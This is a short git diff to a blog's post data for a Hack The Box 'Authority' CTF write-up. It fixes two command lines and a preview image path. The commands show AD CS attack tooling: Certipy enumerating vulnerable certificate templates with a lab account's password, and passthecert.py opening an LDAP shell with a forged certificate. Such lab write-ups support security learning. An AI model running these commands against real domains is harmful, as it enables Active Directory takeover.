@@ -389,7 +389,7 @@ const newPost = {
     <ul>
     <pre><code>
     ┌──(root㉿N1NJ10)-[~/Downloads/tools/Certipy/certipy]
-    └─# python3 [entry.py](http://entry.py/) find -u svc_ldap@authority.htb -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.10.11.222 -vulnerable
+    └─# python3 certipy find -u svc_ldap@authority.htb -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.10.11.222 -vulnerable
     Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
     [*] Finding certificate templates
@@ -554,7 +554,7 @@ const newPost = {
     [*] Writing private key to 'user.key'
 
     ┌──(root㉿N1NJ10)-[~/HTB/Authority]
-    └─# python [passthecert.py](http://passthecert.py/) -action ldap-shell -crt user.crt -key user.key -domain authority.htb -dc-ip 10.10.11.222
+    └─# python passthecert.py -action ldap-shell -crt user.crt -key user.key -domain authority.htb -dc-ip 10.10.11.222
     Impacket v0.12.0.dev1+20231130.165011.d370e63 - Copyright 2023 Fortra
 
     Type help for list of commands
@@ -645,7 +645,7 @@ const newPost = {
     `,
     description: 'Authority is a medium-difficulty Windows machine that highlights the dangers of misconfigurations, password reuse, storing credentials on shares, and demonstrates how default settings in Active Directory (such as the ability for all domain users to add up to 10 computers to the domain) can be combined with other issues (vulnerable AD CS certificate templates) to take over a domain. ',
     date: new Date(2024, 1, 1),
-    previewPicture: '../photos/Macro.png',
+    previewPicture: '../photos/Authority.png',
     tags: ['htb','windows','ad','ctf'],
     author: 'N1NJ10',
     category: 'ctf'
